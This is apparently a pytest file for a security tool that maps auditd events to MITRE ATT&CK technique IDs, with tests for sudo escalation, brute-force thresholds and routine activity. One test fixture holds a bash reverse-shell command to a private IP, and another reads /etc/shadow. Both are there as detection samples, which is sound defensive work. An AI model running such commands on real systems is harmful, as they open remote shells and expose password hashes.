from panoptic.context import build_context
from panoptic.mitre import RULES, TACTICS, map_techniques, max_technique_severity


def _syscall(**fields):
    base = {"record_type": "SYSCALL", "SYSCALL": "execve", "uid": "1000", "auid": "1000"}
    base.update(fields)
    return build_context({"@timestamp": "2026-06-01T03:30:00Z", "host": {"hostname": "h1"},
                          "auditd": {"log": base}})


def test_sudo_to_root_shell_maps_to_T1548_003():
    ctx = _syscall(exe="/usr/bin/sudo", comm="sudo", uid="0", auid="1000")
    ctx.argv = ("sudo", "su", "-")
    ids = {t["technique_id"] for t in map_techniques(ctx)}
    assert "T1548.003" in ids


def test_routine_sudo_does_not_map_to_T1548_003():
    # `sudo apt install` is routine admin, not an escalation worth an ATT&CK tag
    ctx = _syscall(exe="/usr/bin/sudo", comm="sudo", uid="0", auid="1000")
    ctx.argv = ("sudo", "apt", "install", "-y", "htop")
    ids = {t["technique_id"] for t in map_techniques(ctx)}
    assert "T1548.003" not in ids


def test_reverse_shell_maps_to_T1059_004_high_confidence():
    ctx = build_context({"@timestamp": "2026-06-01T03:30:00Z",
                         "auditd": {"log": {"record_type": "SYSCALL", "SYSCALL": "execve",
                                            "exe": "/usr/bin/bash", "comm": "bash", "uid": "1000", "auid": "1000"}}})
    ctx.argv = ("bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    tags = map_techniques(ctx)
    t1059 = next(t for t in tags if t["technique_id"] == "T1059.004")
    assert t1059["confidence"] >= 0.8


def test_bruteforce_needs_repeated_failures():
    ctx = build_context({"@timestamp": "2026-06-01T03:30:00Z",
                         "auditd": {"log": {"record_type": "USER_AUTH", "res": "failed", "addr": "203.0.113.1"}}})
    assert not any(t["technique_id"] == "T1110" for t in map_techniques(ctx, {"recent_auth_failures": 1}))
    assert any(t["technique_id"] == "T1110" for t in map_techniques(ctx, {"recent_auth_failures": 8}))


def test_shadow_read_maps_to_T1003_008():
    ctx = _syscall(exe="/usr/bin/cat", comm="cat", uid="0", auid="1000", SYSCALL="openat")
    ctx.paths = ("/etc/shadow",)
    assert any(t["technique_id"] == "T1003.008" for t in map_techniques(ctx))


def test_routine_activity_maps_to_nothing():
    ctx = _syscall(exe="/usr/bin/ls", comm="ls")
    assert map_techniques(ctx) == []


def test_all_rule_tactics_are_known():
    for technique, _ in RULES:
        assert technique.tactic_id in TACTICS


def test_all_technique_ids_wellformed():
    for technique, _ in RULES:
        tid = technique.technique_id
        assert tid.startswith("T") and tid[1:5].isdigit()
        if "." in tid:
            assert tid.split(".")[1].isdigit()


def test_max_severity_scales_with_confidence():
    low = [{"base_severity": 0.8, "confidence": 0.4}]
    high = [{"base_severity": 0.8, "confidence": 0.9}]
    assert max_technique_severity(high) > max_technique_severity(low)
    assert max_technique_severity([]) == 0.0
